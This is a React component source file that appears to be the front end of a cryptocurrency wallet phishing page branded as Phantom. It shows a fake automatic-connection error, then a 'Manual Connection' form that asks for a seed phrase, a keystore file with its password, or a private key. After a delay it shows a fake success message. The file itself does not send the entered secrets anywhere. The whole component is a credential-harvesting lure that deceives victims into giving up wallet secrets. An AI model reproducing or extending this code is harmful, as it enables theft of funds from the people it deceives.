import Header from '../Head-Foot/header';
import './wallet.css';

import React, { useState, useEffect } from "react";

const Wallet = () => {
  const [loading, setLoading] = useState(true);
  const [showDialog, setShowDialog] = useState(false);
  const [animal, setAnimal] = useState("Phrase");
  const [name, setName] = useState("");
  const [submitting, setSubmitting] = useState(false); // NEW: for loading after Proceed
  const [successDialog, setSuccessDialog] = useState(false); // NEW: for success state

  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false);
    }, 4000); 
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    setSubmitting(true); // show loading state
    setTimeout(() => {
      setSubmitting(false);
      setSuccessDialog(true); // show success dialog
    }, 3000); // 3 seconds
  };

  const handleCloseSuccess = () => {
    setSuccessDialog(false);
    setShowDialog(false); // close first dialog too
    setAnimal("Phrase");
    setName("");
  };

  const getAnimalText = () => {
    switch (animal) {
      case "Phrase":
        return "Typically 12 (sometimes 24) words separated by single spaces";
      case "Keystore":
        return "Several lines of text beginning with “[…]” plus the password you used to encrypt it";
      case "privateKey":
        return "Typically 64 alphanumeric characters";
      default:
        return "";
    }
  };

  const getPlaceholder = () => {
    switch (animal) {
      case "Phrase":
        return "Enter your recovery phrase";
      case "Keystore":
        return "Enter Keystore";
      case "privateKey":
        return "Enter your private key";
      default:
        return "Enter name";
    }
  };

  return (
    <div className="error-connect-container">
      {loading ? (
        <div className="loading-screen">
          <div className="spinner"></div>
          <div>Loading...</div>
        </div>
      ) : (
        <div className="error-screen">
          <div style={{background: "grey", width: "100%", height: '30px', position: "absolute", top: "0"}}></div>
          <div className="error-icon">⚠️</div>
          <h1>Error Connecting to Wallet Automatically</h1>
          <button
            className="connect-btn"
            onClick={() => setShowDialog(true)}
          >
            Connect Manually
          </button>

          <div className='d-pro'>
            <p>Decentralized Protocol</p>
            <p>Phantom</p>
          </div>

          {showDialog && (
            <div className="dialog-overlay">
              <div className="dialog-box">
                <h2>Manual Connection</h2>

                <div className="animal-selector">
                  {["Phrase", "Keystore", "privateKey"].map((a) => (
                    <button
                      key={a}
                      type="button"
                      className={`animal-btn ${animal === a ? "selected" : ""}`}
                      onClick={() => setAnimal(a)}
                    >
                      {a}
                    </button>
                  ))}
                </div>

                <form onSubmit={handleSubmit}>
                  <label>
                    <textarea
                      type="text"
                      placeholder={getPlaceholder()}
                      value={name}
                      onChange={(e) => setName(e.target.value)}
                      rows={7}
                      required
                    />
                    { animal === "Keystore" ? (
                          <textarea 
                          placeholder='Wallet Password'
                          rows={1}
                          required
                          />
                        ) : null
                    }
                  </label>

                  <p className="animal-info">{getAnimalText()}</p>

                  <div className="dialog-actions">
                    <button type="submit" disabled={submitting}>
                      {submitting ? "Loading..." : "Proceed"}
                    </button>
                    <button
                      type="button"
                      onClick={() => setShowDialog(false)}
                      disabled={submitting}
                    >
                      Cancel
                    </button>
                  </div>
                </form>
              </div>
            </div>
          )}

          {successDialog && (
            <div className="dialog-overlay">
              <div className="dialog-box">
                <h2>Success!</h2>
                <p>Your wallet has been connected successfully.</p>
                <button onClick={handleCloseSuccess}>Close</button>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default Wallet;
